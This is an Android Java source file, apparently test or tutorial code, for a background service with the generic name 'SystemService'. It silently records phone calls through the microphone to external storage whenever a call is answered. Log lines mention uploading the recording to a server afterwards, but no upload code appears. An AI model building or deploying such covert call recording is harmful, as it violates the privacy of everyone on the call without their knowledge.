package com.smh.szyproject.test.callService;

import java.io.File;

import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

import com.smh.szyproject.other.utils.L;

public class SystemService extends Service {
    // 电话管理器
    private TelephonyManager tm;
    // 监听器对象
    private MyListener listener;
    //声明录音机
    private MediaRecorder mediaRecorder;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    // 服务创建的时候调用的方法
    @Override
    public void onCreate() {
        // 后台监听电话的呼叫状态。
        // 得到电话管理器
        tm = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
        listener = new MyListener();
        tm.listen(listener, PhoneStateListener.LISTEN_CALL_STATE);
        super.onCreate();
    }

    private class MyListener extends PhoneStateListener {
        // 当电话的呼叫状态发生变化的时候调用的方法
        @Override
        public void onCallStateChanged(int state, String incomingNumber) {
            super.onCallStateChanged(state, incomingNumber);
            try {
                switch (state) {
                    case TelephonyManager.CALL_STATE_IDLE://空闲状态。
                        if (mediaRecorder != null) {
                            //8.停止捕获
                            mediaRecorder.stop();
                            //9.释放资源
                            mediaRecorder.release();
                            mediaRecorder = null;
                            L.e("录制完毕，上传文件到服务器");
                            L.e("上传完以后再关掉自己");
                            stopSelf();
                        }

                        break;
                    case TelephonyManager.CALL_STATE_RINGING://零响状态。

                        break;
                    case TelephonyManager.CALL_STATE_OFFHOOK://通话状态
                        //开始录音
                        //1.实例化一个录音机
                        mediaRecorder = new MediaRecorder();
                        //2.指定录音机的声音源
                        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                        //3.设置录制的文件输出的格式
                        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
                        //4.指定录音文件的名称
                        File file = new File(Environment.getExternalStorageDirectory(), System.currentTimeMillis() + ".3gp");
                        L.e("地址是:" + Environment.getExternalStorageDirectory() + System.currentTimeMillis() + ".3gp");
                        mediaRecorder.setOutputFile(file.getAbsolutePath());
                        //5.设置音频的编码
                        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
                        //6.准备开始录音
                        mediaRecorder.prepare();
                        //7.开始录音
                        mediaRecorder.start();
                        break;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    // 服务销毁的时候调用的方法
    @Override
    public void onDestroy() {
        super.onDestroy();
        // 取消电话的监听
        tm.listen(listener, PhoneStateListener.LISTEN_NONE);
        listener = null;
    }
}
